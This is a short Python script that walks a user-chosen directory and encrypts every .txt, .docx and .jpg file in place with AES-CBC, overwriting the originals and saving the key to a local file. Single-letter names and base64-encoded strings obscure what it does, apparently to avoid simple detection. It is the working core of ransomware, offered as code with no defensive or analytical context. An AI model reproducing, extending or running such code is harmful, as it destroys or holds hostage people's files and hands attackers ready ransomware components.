from Crypto.Cipher import AES as A
from Crypto.Random import get_random_bytes as R
from Crypto.Util.Padding import pad as P
import os as O
import base64 as B

def z(x):
    k = R(16)
    for f in x:
        with open(f, 'rb') as a:
            d = a.read()
        v = R(16)
        d_p = P(d, A.block_size)
        c = A.new(k, A.MODE_CBC, v)
        e = c.encrypt(d_p)
        with open(f, 'wb') as a:
            a.write(v + e)
    return k

def y(k, n):
    with open(n, 'wb') as f:
        f.write(k)

if __name__ == "__main__":
    p = input(B.b64decode(b'RW50ZXIgdGhlIGRpcmVjdG9yeSB0byBlbmNyeXB0IGZpbGVzIGZyb206IA==').decode()).strip()
    e = ('.txt', '.docx', '.jpg')
    t = []

    for r, d, f in O.walk(p):
        for fn in f:
            if fn.endswith(e):
                t.append(O.path.join(r, fn))

    if not t:
        print(B.b64decode(b'W1tdIE5vIHRhcmdldCBmaWxlcyBmb3VuZC4=').decode())
    else:
        print(f"{B.b64decode(b'WypdIEVuY3J5cHRpbmcg').decode()}{len(t)}{B.b64decode(b'IGZpbGVzLi4u').decode()}")
        k = z(t)
        y(k, "test_key.bin")
        print(B.b64decode(b'W1xcdV0gVGVzdCBlbmNyeXB0aW9uIGNvbXBsZXRlZC4=').decode())
